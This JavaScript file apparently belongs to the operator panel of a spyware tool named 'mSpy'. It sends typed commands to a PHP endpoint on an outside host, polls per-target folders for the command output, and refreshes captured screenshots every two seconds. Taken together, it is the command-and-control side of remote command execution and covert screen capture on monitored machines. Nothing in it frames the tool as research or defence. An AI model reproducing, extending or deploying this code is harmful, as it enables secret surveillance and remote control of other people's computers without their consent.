
document.getElementById('PushCommand').addEventListener('click', function() {
    let command = document.getElementById('RequestCommand').value;

    // Sending command to PHP using fetch
    fetch('https://mahsen.ir/APP/mSpy/do.php', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: 'command=' + encodeURIComponent(command) + "&current=" + currentDir
    })
    .then(response => response.text())
    .then(data => {
        document.getElementById('RespondCommand').innerText = data;
    })
    .catch(error => console.error('Error:', error));
});


function GiveRespond() {
    const timestamp = new Date().getTime(); // Get the current timestamp
    // Sending command to PHP using fetch
    fetch('uploads/' + currentDir + '/Respond.txt?' + timestamp, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        }
    })
    .then(response => response.text())
    .then(data => {
        document.getElementById('RespondCommand').innerText = data;
    })
    .catch(error => console.error('Error:', error));
}

// Function to refresh the image based on the directory clicked
function changeImage(directory) {
    currentDir = directory;
    updateImage();
}

// Function to update the image after download completes
function updateImage() {
    const imageElement = document.getElementById('screenshot');
    const timestamp = new Date().getTime(); // Get the current timestamp
    const imageUrl = 'uploads/' + currentDir + '/ScreenShot.jpg?' + timestamp; // Append timestamp to image URL

    // Create a new image object to preload the image
    const img = new Image();
    img.onload = function () {
        imageElement.src = img.src; // Update the image source once the image is fully loaded
    };
    img.src = imageUrl; // Set the image source for the preloading
}

// Automatically refresh image every 2 seconds
setInterval(updateImage, 2000);
setInterval(GiveRespond, 5000);